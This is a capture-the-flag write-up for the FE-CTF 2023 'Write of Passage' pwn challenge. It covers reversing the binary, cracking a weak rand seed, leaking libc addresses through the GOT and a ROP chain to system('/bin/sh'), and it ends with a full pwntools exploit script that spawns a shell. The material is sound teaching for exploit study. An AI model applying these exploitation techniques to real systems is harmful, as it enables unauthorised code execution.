# FE-CTF 2023: The UniPwnie Experience

# Challenge: Write of Passage
**Tags:** `pwn`, `remote`

## Table of Contents
- [What is This?](#what-is-this)
- [What is This (Really)?](#what-is-this-really)
- [The Vulnerability](#the-vulnerability)
- [Loopy Binary](#loopy-binary)
- [Cracking Seed](#cracking-seed)
- [Saving Time - Patching the Binary](#saving-time---patching-the-binary)
- [Leaking Libc](#leaking-libc)
- [Rop Rop Rop](#rop-rop-rop)
- [The Final Script](#the-final-script)

## What is This?
The player is given a `tar` archive containing:
```
$ ls
ld-linux-x86-64.so.2  libc.so.6  main*
```

and an endpoint where the program is running:
```
write-of-passage.hack.fe-ctf.dk:1337
```

By connecting to the service/running the program, the banner below is shown and two questions `"what is it?"` and `"Where is it?"` are asked where  corresponding answers are expected. Giving the program "random" numbers as input, we get a segfault:
```
$ ./main
 █     █░ ██▀███   ██▓▄▄▄█████▓▓█████     ▒█████    █████▒    ██▓███   ▄▄▄        ██████   ██████  ▄▄▄        ▄████ ▓█████
▓█░ █ ░█░▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒▓█   ▀    ▒██▒  ██▒▓██   ▒    ▓██░  ██▒▒████▄    ▒██    ▒ ▒██    ▒ ▒████▄     ██▒ ▀█▒▓█   ▀
▒█░ █ ░█ ▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░▒███      ▒██░  ██▒▒████ ░    ▓██░ ██▓▒▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▒██  ▀█▄  ▒██░▄▄▄░▒███
░█░ █ ░█ ▒██▀▀█▄  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒██   ██░░▓█▒  ░    ▒██▄█▓▒ ▒░██▄▄▄▄██   ▒   ██▒  ▒   ██▒░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄
░░██▒██▓ ░██▓ ▒██▒░██░  ▒██▒ ░ ░▒████▒   ░ ████▓▒░░▒█░       ▒██▒ ░  ░ ▓█   ▓██▒▒██████▒▒▒██████▒▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
░ ▓░▒ ▒  ░ ▒▓ ░▒▓░░▓    ▒ ░░   ░░ ▒░ ░   ░ ▒░▒░▒░  ▒ ░       ▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
  ▒ ░ ░    ░▒ ░ ▒░ ▒ ░    ░     ░ ░  ░     ░ ▒ ▒░  ░         ░▒ ░       ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
  ░   ░    ░░   ░  ▒ ░  ░         ░      ░ ░ ░ ▒   ░ ░       ░░         ░   ▒   ░  ░  ░  ░  ░  ░    ░   ▒   ░ ░   ░    ░
    ░       ░      ░              ░  ░       ░ ░                            ░  ░      ░        ░        ░  ░      ░    ░  ░

What is it?
213
Where is it?
321
Segmentation fault (core dumped)
``` 
To further analyse this, we will reverse the binary. We also notice that the binary has writeable GOT and that there are no stack canaries:
```
$ checksec main
[*] './main'
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enable
```
## What is this (really)?

From IDA we can extract some decompiled code:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  alarm(0xB4u);
  v3 = write_of_passage(180LL);
  ((void (__fastcall __noreturn *)(__int64))tests[v3])(180LL);
}

```
The `main` function calls `write_of_passage` and uses the returned to execute a pointer contained in the array `tests`. The array contains two function pointers.
```c
void __noreturn test_failed()
{
  puts("Clearly, you do not have what it takes.");
  _exit(1);
}

int test_passed()
{
  return puts("Impressive.  Welcome to the club.");
}
```
* `tests[0] = &test_failed` and `tests[1] = &test_passed`
* Where the only essential difference is that one exits and the other does not.

Looking deeper into
```c
__int64 write_of_passage()
{
  char v1; // bl
  unsigned __int64 v2; // rax
  __int64 where; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 what; // [rsp+8h] [rbp-18h] BYREF

  puts(banner);
  puts("What is it?");
  if ( !(unsigned int)__isoc99_scanf("%lld", &what) )
    return 0LL;
  puts("Where is it?");
  if ( (unsigned int)__isoc99_scanf("%lld", &where) )
  {
    v1 = rand();
    v2 = getauxval(what);
    *(_BYTE *)(where + v2) = v1;
  }
  return 0LL;
}
```
  * The code prints the huge banner
  * It then asks for two numbers, where the first is used as an argument to call `getauxval` which returns `v2`.
  * It then uses `where` and `v2` to write the value `v1` (which is obtained using `rand()`)
  * The function always returns `0`, meaning that `tests[0]` will be called in `main`.

From the man page of `getauxval`:
*   *The  getauxval() function retrieves values from the auxiliary vector, a mechanism that the kernel's ELF binary loader uses to pass certain information to user space when a program is executed. Each entry in the auxiliary vector consists of a pair of values: a type that identifies what this entry represents, and a value  for  that  type. Given the argument type, getauxval() returns the corresponding value.*


There are some interesting types, some of which are listed below:

* *AT_BASE*
  * The base address of the program interpreter (usually, the dynamic linker)
* *AT_PHDR*
  * The address of the program headers of the executable.
* *AT_RANDOM*
  * The address of sixteen bytes containing a random value.
* *AT_ENTRY*
  * The entry address of the executable.

The integral values can be found in the elf header file: https://code.woboq.org/libreoffice/include/elf.h.html

This means that by calling `getauxval(AT_ENTRY)`, `v2` will contain the address of `_start`. In this scenario the function would then write to some offset starting from `_start`.

## The Vulnerability

There is also another peculiar function in the binary which is the following:
```c
void seed_rand()
{
  int v0; // ebx
  int v1; // eax

  v0 = *(_DWORD *)getauxval(AT_RANDOM);
  v1 = time(0LL);
  srand(v0 | v1);
}
```
It does not seem that it is called anywhere by user code. This indicates that it is perhaps put into `.init_array`. The `.init_array` section is used to store an array of function pointers that will be called before calling main. We can check for this using `readelf`.

`seed_rand` is at offset `0x1264`:

```
$ readelf -s  main | grep seed
13: 0000000000001264    49 FUNC    LOCAL  DEFAULT   15 seed_rand
```
Looking into `.init_array` (below) we indeed see that `seed_rand` is present. The `0x11b0` is the address of the `frame_dummy` function, which is there by default: 

```
$ readelf -x .init_array main
Hex dump of section '.init_array':
  0x00003dc8 b0110000 00000000 64120000 00000000 ........d.......
```

The vulnerability lies in how the seed for the call `srand(v0 | v1)` is produced. Assuming the program is started as soon as we connect to the server, we know the value of `v1 = time(0)`. The symbol `v0` contains 32 random bits which we do not know, but as the `|` operator is used, bits that are already set to `1` in `v1` will also be `1` in `v1 | v0`. Hence if we were to guess the seed, we only need to consider the bits that are set to `0` in `v1`. If the number of `1` bits is sufficiently large, this might be a possibility. We can quickly check this using gdb setting a breakpoint after the call to `time(0)`. This
shows that there are `17` 1 bits and `15` 0 bits. This will change depending on the time, but most of the bits will be constant within reasonable time and bruteforcing `15`-ish bits locally is doable.

Cracking the seed will allows us to predict `rand()` and we can use this to carefully write predictable bytes to predictable locations. Before we can do this however, we need the program to not crash, which it does at the moment because of the `test_failed` function.

## Loopy Binary

To obtain multiple writes, we can get the binary to loop. The idea is to overwrite the least significant byte of `tests[0]` which contains `&test_failed` and hope the resulting address is in `main`. This is possible as only the least significant byte differs between addresses of `test_failed` and some of `main`. It does however seem through testing that we need to hit the start of main if it needs to go well:

```
$ objdump -D main -M intel | grep test_failed -A 48
0000000000001295 <test_failed>:
    1295:	55                   	push   rbp
    1296:	48 89 e5             	mov    rbp,rsp
    1299:	48 8d 05 88 0d 00 00 	lea    rax,[rip+0xd88]        # 2028 <_IO_stdin_used+0x28>
    12a0:	48 89 c7             	mov    rdi,rax
    12a3:	e8 98 fd ff ff       	call   1040 <puts@plt>
    12a8:	bf 01 00 00 00       	mov    edi,0x1
    12ad:	e8 7e fd ff ff       	call   1030 <_exit@plt>

00000000000012b2 <test_passed>:
    12b2:	55                   	push   rbp
    12b3:	48 89 e5             	mov    rbp,rsp
    12b6:	48 8d 05 93 0d 00 00 	lea    rax,[rip+0xd93]        # 2050 <_IO_stdin_used+0x50>
    12bd:	48 89 c7             	mov    rdi,rax
    12c0:	e8 7b fd ff ff       	call   1040 <puts@plt>
    12c5:	90                   	nop
    12c6:	5d                   	pop    rbp
    12c7:	c3                   	ret

00000000000012c8 <main>:
    12c8:	55                   	push   rbp
    12c9:	48 89 e5             	mov    rbp,rsp
    12cc:	48 83 ec 10          	sub    rsp,0x10
    12d0:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
    12d3:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
    12d7:	48 8b 05 32 37 00 00 	mov    rax,QWORD PTR [rip+0x3732]        # 4a10 <stdin@GLIBC_2.2.5>
    12de:	be 00 00 00 00       	mov    esi,0x0
    12e3:	48 89 c7             	mov    rdi,rax
    12e6:	e8 65 fd ff ff       	call   1050 <setbuf@plt>
    12eb:	48 8b 05 0e 37 00 00 	mov    rax,QWORD PTR [rip+0x370e]        # 4a00 <stdout@GLIBC_2.2.5>
    12f2:	be 00 00 00 00       	mov    esi,0x0
    12f7:	48 89 c7             	mov    rdi,rax
    12fa:	e8 51 fd ff ff       	call   1050 <setbuf@plt>
    12ff:	48 8b 05 1a 37 00 00 	mov    rax,QWORD PTR [rip+0x371a]        # 4a20 <stderr@GLIBC_2.2.5>
    1306:	be 00 00 00 00       	mov    esi,0x0
    130b:	48 89 c7             	mov    rdi,rax
    130e:	e8 3d fd ff ff       	call   1050 <setbuf@plt>
    1313:	bf b4 00 00 00       	mov    edi,0xb4
    1318:	e8 43 fd ff ff       	call   1060 <alarm@plt>
    131d:	e8 97 fe ff ff       	call   11b9 <write_of_passage>
    1322:	48 98                	cdqe
    1324:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
    132b:	00
    132c:	48 8d 05 ad 36 00 00 	lea    rax,[rip+0x36ad]        # 49e0 <tests>
    1333:	48 8b 04 02          	mov    rax,QWORD PTR [rdx+rax*1]
    1337:	ff d0                	call   rax
    1339:	b8 00 00 00 00       	mov    eax,0x0
    133e:	c9                   	leave
    133f:	c3                   	ret
```

We also notice that if we hit main using this approach, we will always do the `alarm` call again which will reset the alarm, as stated in its man page below.
```
DESCRIPTION
       alarm() arranges for a SIGALRM signal to be delivered to the calling process in seconds seconds.

       If seconds is zero, any pending alarm is canceled.

       In any event any previously set alarm() is canceled.
```
This means we do not really have to worry about the alarm once we have a looping program.

Some quick code shows that eventually the banner will be printed:
```python
def what_where(type, offset):
  global r
  r.sendlineafter("What is it?", f"{type}".encode())
  r.sendlineafter("Where is it?", f"{offset}".encode())

def main():
  global r
  while True:
    r = conn()
    what_where(AT_ENTRY, exe.symbols['tests'] - exe.symbols['_start'])
    try:
      a = r.recvline() + r.recvline()
      print(a)
    except Exception as e:
      pass
    r.close()
```
With output:
``` 
[...]
[+] Starting local process './main': pid 12349
[*] Process './main' stopped with exit code -11 (SIGSEGV) (pid 12349)
[+] Starting local process './main': pid 12360
[*] Process './main' stopped with exit code -11 (SIGSEGV) (pid 12360)
[+] Starting local process './main': pid 12371
[*] Process './main' stopped with exit code -4 (SIGILL) (pid 12371)
[+] Starting local process './main': pid 12382
[*] Process './main' stopped with exit code -4 (SIGILL) (pid 12382)
[+] Starting local process './main': pid 12393
[*] Process './main' stopped with exit code -11 (SIGSEGV) (pid 12393)
[+] Starting local process './main': pid 12404
[*] Process './main' stopped with exit code 1 (pid 12404)
[+] Starting local process './main': pid 12406
[*] Process './main' stopped with exit code -4 (SIGILL) (pid 12406)
[+] Starting local process './main': pid 12417
b'\n \xe2\x96\x88     \xe2\x96\x88\xe2\x96\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88     \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x84\xe2\x96\x84\xe2\x96\x84        \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x84\xe2\x96\x84\xe2\x96\x84        \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \n'
[...]
```

So it would make sense to run this loop until seeing the questions `"what is it"` and `"where is it"`. This is obtained using the following code:
```python
banner_bytes = exe.symbols['__compound_literal.0']
banner_ref = exe.symbols['banner']

libc_rand_calls = 0

some_banner = b"\xe2\x96\x88\x20\x20\x20\x20\x20\xe2\x96\x88\xe2\x96\x91"

def what_where(type, offset):
  global r
  global libc_rand_calls
  libc_rand_calls += 1
  r.sendlineafter(b"What is it?\n", f"{type}".encode(), timeout=2)
  r.sendlineafter(b"Where is it?\n", f"{offset}".encode(), timeout=2)

def loopyloop():
  global r
  global libc_rand_calls
  for _ in tqdm(range(1000)):
    r = conn()
    time = libc_time(0)
    what_where(AT_ENTRY, exe.symbols['tests'] - exe.symbols['_start'])
    try:
      # If it works again and we see the banner, we have a loop!
      what_where(AT_ENTRY, banner_bytes - exe.symbols['_start'])
      r.recvuntil(some_banner, timeout=2)
      
      return r, time
    except Exception as _:
      r.close()
      libc_rand_calls = 0

```
Notice that in the `try-catch` we write to the banner and not `tests[0]`, as we are checking if we have a loop and need to write the data somewhere else.

## Cracking Seed
We now have a looping binary and will focus on cracking the seed. Using the `ctypes` library in python to calculate `libc.time(0)`, we try all possibilities where the `0` bits are either `1` or `0`. For a stopping condition we can use some of randomly generated values in program. We can leak these by writing them to the `banner` as they will automatically be printed when banner is shown. The code can be seen below. 

```python
def crackycrack(time):
  global r
  # Obtain some random values
  rand_leaks = []
  
  libc_rand_calls_b4 = libc_rand_calls

  for i in range(3):
    what_where(AT_ENTRY, banner_bytes - exe.symbols['_start'])
    rand_leaks.append(r.recvuntil(some_banner, timeout=2)[0])

  # Crack the seed using the remote rand values
  brepr    = bin(time)[2:]
  bindices = [e for e,i in enumerate(brepr) if i == '0']
  
  for num in tqdm(range(2**len(bindices))):
    tmp = list(brepr)
    numbin = bin(num)[2:].rjust(len(bindices), '0')
    for e,j in enumerate(numbin):
      tmp[bindices[e]] = j

    test_seed = int(''.join(tmp), 2)

    libc_srand(test_seed)

    for _ in range(libc_rand_calls_b4):
      libc_rand()

    if all((libc_rand(test_seed) & 0xff) == i for i in rand_leaks):
      return test_seed
  return None
```
Updating `main` as well, we can for example write some data to the `got` entry of the `time` function:
```python
def main():
  r, time = loopyloop()
  seed = crackycrack(time)
  if not seed:
    log.info(f"Seed cracking failed.")
    return 
  log.info(f"Found seed: {hex(seed)}")

  writywrite(b'A'*8, AT_ENTRY, exe.got.time - exe.symbols['_start'])
  gdb.attach(r)

  r.interactive()
```

We can check using gdb by attaching to the process, that we will eventually write the `A`'s to the desired location:
```
pwndbg> x/gx 0x56034509d028
0x56034509d028 <time@got.plt>:	0x4141414141414141
```

## Saving Time - Patching the Binary

To save time, we make a local copy of the binary where the least significant byte of `tests[0]` is changed so that we hit the beginning of main. This makes it much easier to debug and progress as we can skip the part of getting the binary to loop. To patch `tests[0]`, it is not enough to change the value in `.data`, we need to look into the `.rela.dyn` section:

```
Relocation section '.rela.dyn' at offset 0x6f0 contains 15 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
[...]
0000000049e0  000000000008 R_X86_64_RELATIVE                    1295
0000000049e8  000000000008 R_X86_64_RELATIVE                    12b2
[...]
```
* Here we want to change `1295` to `12c8`.
* I did this using  `hexedit` going to offset `0x6f0` and then looking forward for `95 12` 
* The patched binary we call `main_tmp`, and opening in it in gdb, we see the address in `tests[0]` has changed:
```
pwndbg> dq &tests
000055d374ac89e0     000055d374ac52c8 000055d374ac52b2
000055d374ac89f0     0000000000000000 0000000000000000
```

## Leaking Libc

Coming back to pwning, we can write data to offsets from `ld` and the `binary` using `getauxval`, but we can not leak addreses this way. 

In the user code, we have multiple calls to `puts` to print various strings (banner, what and where strings). The idea is to overwrite one of these pointers to point to some entry in `.got.plt` to leak the resolved libc addresses.

The chosen candidate is the banner as it is placed in `.data` and is thus writable. The two what/where strings are placed in readonly `.rodata`.

Below, we overwrite the `banner` with a reference to the `GOT` entry for `puts`. Luckliy the pointers in memory are close to each other, so we only need to overwrite the least significant byte:
```python
# Get leak
writywrite(p8(exe.got.puts & 0xff), AT_ENTRY, banner_ref - exe.symbols['_start'])
libc.address = u64(r.recvline(keepends=False).ljust(8, b'\0')) - libc.symbols['puts']
log.info(f'libc: {hex(libc.address)}')
```

Also note that I am using https://github.com/io12/pwninit to replace my system libc + linker with the one given in the handout. The final binary to use locally is therefore named `main_tmp_patched`.

## Rop Rop Rop

Initially the approach was to overwrite some entry in `GOT` with a `one-gadget` and then make the code call the chosen function corresponding to that `GOT`. There is for example an `exit` call in `test_failed`. However looking into the `one_gadgets` available (below), the constraints does not seem be easily fulfilled:

```
$ one_gadget libc.so.6
0x4c050 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbx == NULL || (u16)[rbx] == NULL

0xf2592 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xf259a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xf259f posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

We will instead try to ROP our way to a `system("/bin/sh")` call using the `libc` leak. The idea is to use `getauxval(AT_RANDOM)`, which returns a pointer on the stack. We will use this pointer to write to some offset on the stack. This offset will have to align such that when returning from some function, we can return/jump to our rop chain.

When looking at main, the `sub rsp, 0x10` will create a new stack frame and when the call occurs on `0x1337` (coincidence?), then because we overwrote `tests[0]`, we will jump back to main and make a new stack frame (without any cleaning).

```
00000000000012c8 <main>:
    12c8:	55                   	push   rbp
    12c9:	48 89 e5             	mov    rbp,rsp
    12cc:	48 83 ec 10          	sub    rsp,0x10
    [...]
    1333:	48 8b 04 02          	mov    rax,QWORD PTR [rdx+rax*1]
    1337:	ff d0                	call   rax
    1339:	b8 00 00 00 00       	mov    eax,0x0
    133e:	c9                   	leave
    133f:	c3                   	ret
```

The prolog of main makes space for 24 bytes, and the call at offset `0x1337` above, pushes address `0x1339` on the stack. Keep these offsets in mind, as we will keep refering to them later. The binary will loop many times and the stack will look something like this:
```
00:0000│ rsp 0x7ffea7effef0 —▸ [data1]
01:0008│     0x7ffea7effef8 ◂— [data2]
02:0010│ rbp 0x7ffea7efff00 —▸ 0x7ffea7efff20 —▸ 0x7ffea7efff40 —▸ ...
03:0018│     0x7ffea7efff08 —▸ 0x55e1b76bd339 ◂— mov eax, 0

04:0020│     0x7ffea7efff10 —▸ [data3]
05:0028│     0x7ffea7efff18 ◂— [data4]
06:0030│     0x7ffea7efff20 —▸ 0x7ffea7efff40 —▸ 0x7ffea7efff60 —▸ ...
07:0038│     0x7ffea7efff28 —▸ 0x55e1b76bd339 ◂— mov eax, 0

08:0040│     0x7ffea7efff30 —▸ [data5]
09:0048│     0x7ffea7efff38 ◂— [data6]
0a:0050│     0x7ffea7efff40 —▸ 0x7ffea7efff60 —▸ 0x7ffea7efff80 —▸ ...
0b:0058│     0x7ffea7efff48 —▸ 0x55e1b76bd339 ◂— mov eax, 0
[...]
```
Notice how the `rbp` pointers refer to each other on the stack in a chain.

The idea is then to overwrite `tests[0]` to point to a `ret` instruction instead, then when called next time at `0x1337`, the stack will be exhausted because of the consecutive calls to `leave; ret` at offset `0x1339` (restoring `rbp` and returning to the next `0x1339` address on the stack). 

This essentially gives the following execution chain (emulated by `pwndbg`):
```
   0x55555555533e    leave
   0x55555555533f    ret
    ↓
 ► 0x555555555339    mov    eax, 0
   0x55555555533e    leave
   0x55555555533f    ret
    ↓
   0x555555555339   mov    eax, 0
   0x55555555533e    leave
   0x55555555533f    ret
    ↓
   0x555555555339   mov    eax, 0
   0x55555555533e    leave
   0x55555555533f    ret
```

One would perhaps check through debugging where we would need to place the rop-chain, by using an offset relative to `getauxval(AT_RANDOM)`. However, it is not guaranteed that each run will create the same number of `main` stack frames, as the runs would most likely loop a different number times due to randomness. One could however, of course, try to keep the number of stack frames contant by looping a bit more before overwriting `tests[0]` again. 

I did not go for this approach, but instead tried to simply align the rop chain correctly and use an adjusted offset we got from the debugging.

One more thing to notice is that stack address where the address of `mov eax, 0` (address `0x1339`) is pushed to, is not `0x10` byte aligned, and the `system` function seems to assume that, so we also need to pop `8` bytes off the stack before finally returning to `system`, to make sure `rsp` is `0x10` aligned. The final code for rop part then becomes:

```python
# Rop
# 0x000000000002792e: pop rdi; pop rbp; ret;
pop_rdi_rbp_ret = libc.address+ 0x000000000002792e
ret = b''
ret += p64(pop_rdi_rbp_ret)
ret += p64(next(libc.search(b"/bin/sh\0")))
ret += b'A'*8 # For alignment.
ret += p64(libc.symbols['system'])

writywrite(ret, AT_RANDOM, -0xc61)

# Shell
writywrite(b'\xc7', AT_ENTRY, tests - start)
```
* Where the final value for `-0xc61` is found after a bit of trial and error.
* Here I use `pop_rdi_rbp_ret` gadget to get `rsp` aligned. I used `ropper` (https://github.com/sashs/Ropper) to find the gadget. However a simple `ret` gadget would actually also work.
* The `c7` byte makes `tests[0]` point to a `ret` instruction in the binary.

## The final script
Sometimes it won't work (often because of failing to crack the seed), so the script itself might need to be run a couple of times, but it will eventually crack the seed and give a shell.

```python
#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
from tqdm import tqdm

checksec= False

exe = ELF("./main_tmp_patched", checksec = checksec)
libc = ELF("./libc.so.6", checksec = checksec)
ld = ELF("./ld-linux-x86-64.so.2", checksec = checksec)

libc_time = CDLL(libc.path).time
libc_rand = CDLL(libc.path).rand
libc_srand = CDLL(libc.path).srand

HOST,PORT = "write-of-passage.hack.fe-ctf.dk", 1337

def conn():
  if args.REMOTE:
    r = remote(HOST, PORT)
  elif args.DBG:
    r = gdb.debug([exe.path], gdbscript=gdbscript)
  else:
    r = process([exe.path])
  return r

def what_where(type, offset):
  global r
  global libc_rand_calls
  libc_rand_calls += 1
  r.sendlineafter(b"What is it?\n",  f"{type}".encode(), timeout=2)
  r.sendlineafter(b"Where is it?\n", f"{offset}".encode(), timeout=2)

def loopyloop():
  global r
  global libc_rand_calls
  for _ in tqdm(range(0x500)):
    r = conn()
    time = libc_time(0)

    # For debugging we use a patched version of the binary.
    if args.REMOTE:
      what_where(AT_ENTRY, tests - start)

    try:
      # Interact again, and if we see the banner we have a loop!
      what_where(AT_ENTRY, banner_bytes - start)
      r.recvuntil(some_banner, timeout=2)
      
      return time
    except Exception as _:
      r.close()
      libc_rand_calls = 0
      continue
  
def crackycrack(time):
  global r

  # Obtain some random values
  rand_leaks = []
  
  libc_rand_calls_b4 = libc_rand_calls

  for i in range(3):
    what_where(AT_ENTRY, banner_bytes - start)
    rand_leaks.append(r.recvuntil(some_banner, timeout=2)[0])

  # Crack the seed using the rand values as tests
  brepr    = bin(time)[2:]
  bindices = [e for e,i in enumerate(brepr) if i == '0']
  
  for num in tqdm(range(2**len(bindices))):
    tmp = list(brepr)
    numbin = bin(num)[2:].rjust(len(bindices), '0')
    for e,j in enumerate(numbin):
      tmp[bindices[e]] = j

    test_seed = int(''.join(tmp), 2)

    libc_srand(test_seed)

    for _ in range(libc_rand_calls_b4):
      libc_rand()

    if all((libc_rand(test_seed) & 0xff) == i for i in rand_leaks):
      return test_seed
  return None

def writywrite(vals, what, where):
  global flag
  global r
  for e,v in enumerate(vals):
    cnt = 0
    while (libc_rand() & 0xff) != v: 
      cnt += 1  

    for _ in range(cnt):
      what_where(AT_ENTRY, banner_bytes - start)

    if flag:
      gdb.attach(r, gdbscript=gdbscript)

    what_where(what, where + e)

gdbscript=f'''
'''

AT_PHDR = 3
AT_ENTRY = 9
AT_BASE =	7 # ld
AT_RANDOM = 25

banner_bytes = exe.symbols['__compound_literal.0']
banner_ref = exe.symbols['banner']
start = exe.symbols['_start']
tests = exe.symbols['tests']

libc_rand_calls = 0

some_banner = b"\xe2\x96\x88\x20\x20\x20\x20\x20\xe2\x96\x88\xe2\x96\x91"

def main():
  global flag
  flag = False

  # Loop
  context.log_level = 'WARNING'
  time = loopyloop()
  context.log_level = 'INFO'
  log.info(f'Loop obtained')

  # Crack
  seed = crackycrack(time)
  if not seed:
    log.info(f"Seed cracking failed.")
    return 
  log.info(f"Found seed: {hex(seed)}")

  # Leak
  writywrite(p8(exe.got.puts & 0xff), AT_ENTRY, banner_ref - start)
  libc.address = u64(r.recvline(keepends=False).ljust(8, b'\0')) - libc.symbols['puts']
  log.info(f'libc: {hex(libc.address)}')

  # Rop
  # 0x000000000002792e: pop rdi; pop rbp; ret;
  pop_rdi_rbp_ret = libc.address+ 0x000000000002792e
  ret = b''
  ret += p64(pop_rdi_rbp_ret)
  ret += p64(next(libc.search(b"/bin/sh\0")))
  ret += b'A'*8 # For alignment.
  ret += p64(libc.symbols['system'])

  writywrite(ret, AT_RANDOM, -0xc61)

  # flag = True
  # Shell
  writywrite(b'\xc7', AT_ENTRY, tests - start)

  r.interactive()

if __name__ == "__main__":
  main()
```